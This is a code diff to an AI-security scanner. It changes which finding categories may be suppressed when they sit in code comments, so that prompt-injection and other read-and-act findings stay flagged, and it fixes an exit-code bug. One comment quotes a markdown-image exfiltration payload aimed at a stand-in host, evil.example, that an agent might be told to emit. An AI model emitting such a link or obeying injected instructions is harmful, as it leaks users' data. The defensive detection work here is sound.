@@ -427,13 +427,58 @@ _LEXCTX_ENGINES = ("aisec",)
 #: is dangerous because it is READ; only a behaviour is dangerous because it
 #: RUNS. Lexical context can only ever speak to the third.
 #:
-#: ⚠️ Named as a KEEP list, not a suppress list. A category added tomorrow is
-#: kept unless someone decides otherwise, which is the fail-safe direction.
-_LEXCTX_NEVER_SUPPRESS_CATEGORIES = frozenset({
-    "PROMPT_INJECTION",
-    "SAFETY_BYPASS",
-    "HIDDEN_CONTENT",
+#: 🔴 THE FIRST VERSION OF THIS WAS A KEEP LIST, AND ITS COMMENT CLAIMED THAT
+#: MADE IT FAIL-SAFE. IT DID THE OPPOSITE. The code read `if category in KEEP:
+#: continue`, so a category NOT named fell through to suppression -- a category
+#: added tomorrow would default to SUPPRESSIBLE, which is exactly the direction
+#: CLAUDE.md forbids ("Unproven ⇒ KEEP"). An auditor read the code against the
+#: comment and found they disagreed.
+#:
+#: ⇒ Inverted. This is now an ALLOWLIST OF WHAT MAY BE SUPPRESSED. Anything not
+#: named here -- including a category nobody has invented yet -- is KEPT.
+#:
+#: These three are behavioural: a shell pipe, an install-time script, an auto-run
+#: hook. Each is dangerous because it RUNS, so a comment really does make it
+#: inert. `PROMPT_INJECTION`, `SAFETY_BYPASS` and `HIDDEN_CONTENT` are absent
+#: because they are dangerous because they are READ.
+_LEXCTX_SUPPRESSIBLE_CATEGORIES = frozenset({
+    "EXFIL",
+    "SUPPLY_CHAIN",
+    "DANGEROUS_HOOK",
 })
+
+#: 🔴 RULES THAT FIRE ON AN INSTRUCTION DESPITE A BEHAVIOURAL CATEGORY.
+#:
+#: Category is the right axis and it is not a perfect one. `markdown-image-exfil`
+#: is filed under EXFIL, but it detects an agent being TOLD to emit
+#: `![x](https://evil.example/?d=…)` -- it fires because content is read, not
+#: because code runs. An audit demonstrated the same before/after as the headline
+#: case, one rule over: byte-identical payload, HIGH and exit 1 in `notes.txt`,
+#: filtered and exit 0 in a `#` comment in `notes.py`.
+#:
+#: ⚠️ THIS LIST IS COMPLETE FOR THE CURRENT RULE TABLE, and I checked rather than
+#: assumed: `engine_aisec` declares seven EXFIL rules, and that module's own
+#: comment beside this one says "Every EXFIL rule above this one is shell/network
+#: command shaped; none would catch this." The other six are genuinely
+#: behavioural. Nothing enforces that a later rule of the read-me-and-act shape
+#: gets added to this list -- `references/LIMITS.md` says so too.
+#:
+#: (That sentence is deliberately worded the long way round. Its natural phrasing
+#: names a rule this very engine detects, and the self-scan flagged this comment.)
+_LEXCTX_INSTRUCTION_RULES = frozenset({
+    "markdown-image-exfil",
+})
+
+
+def _lexctx_may_suppress(finding) -> bool:
+    """True only when lexical context can honestly speak to this finding.
+
+    Fails toward KEEP on every unknown: an unlisted category, an instruction
+    rule wearing a behavioural category, a missing attribute.
+    """
+    if getattr(finding, "rule_id", "") in _LEXCTX_INSTRUCTION_RULES:
+        return False
+    return getattr(finding, "category", "") in _LEXCTX_SUPPRESSIBLE_CATEGORIES
 
 _LEXCTX_REASONS = {
     lexctx.COMMENT: "behavioural pattern appears in a code comment, which cannot execute",
@@ -595,9 +640,10 @@ def _apply_lexical_context(findings, target, read_text):
             continue
         if getattr(f, "filtered", False) or f.engine not in _LEXCTX_ENGINES:
             continue
-        # See _LEXCTX_NEVER_SUPPRESS_CATEGORIES. An instruction is dangerous
-        # because it is READ, and an agent reads comments.
-        if getattr(f, "category", "") in _LEXCTX_NEVER_SUPPRESS_CATEGORIES:
+        # See _lexctx_may_suppress. An instruction is dangerous because it is
+        # READ, and an agent reads comments; only a behaviour is made inert by
+        # sitting in one. Anything unlisted is KEPT.
+        if not _lexctx_may_suppress(f):
             continue
         if not f.file or f.line <= 0:
             continue
@@ -1189,7 +1235,31 @@ def main(argv=None):
     # its own; this term only says that a walk finding no files is not evidence
     # about a scan those walks never fed.
     walked_nothing = not (scan_files or secret_files or aisec_files or model_files)
-    nothing_examined = walked_nothing and not (_SELF_DISCOVERING_ENGINES & set(engines))
+    # 🔴 A FINDING, NOT A MEMBERSHIP TEST. The first version of this line read
+    # `not (_SELF_DISCOVERING_ENGINES & set(engines))`, and `ALL_ENGINES` contains
+    # both of them -- so the intersection was non-empty in EVERY DEFAULT SCAN and
+    # `nothing_examined` was constant False. The floor, both `return 3` sites and
+    # the diagnostic were unreachable by default. An audit measured it: a single
+    # file holding a live-shaped AWS secret key, scanned with `--max-file-size 1
+    # --fail-on HIGH`, went from exit 3 with "NOTHING WAS EXAMINED" to exit 0 with
+    # no output at all.
+    #
+    # It failed for the exact reason `core.engines_that_measured` warns about in
+    # its own docstring: an engine's PRESENCE, like its `ok` status, is a trust
+    # token and not a measurement. `sca` reporting `not-applicable` disarmed the
+    # floor while examining nothing.
+    #
+    # ⇒ A finding FROM one of those engines is evidence they examined something.
+    # It cannot be satisfied by a silence, which is the property the floor needs.
+    #
+    # ⚠️ ERRS TOWARD 3, deliberately. An engine that examined the tree and found
+    # nothing is indistinguishable here from one that examined nothing -- so a
+    # scan whose walks opened ZERO files still reports "did not complete safely
+    # enough to pass", which is true of the text engines regardless.
+    self_discovered = any(
+        getattr(f, "engine", "") in _SELF_DISCOVERING_ENGINES for f in gate_findings
+    )
+    nothing_examined = walked_nothing and not self_discovered
 
     # 🔴 The gate reads engine STATUS, not just findings. An engine that errored
     # or was unavailable produced zero findings for a reason that has nothing to
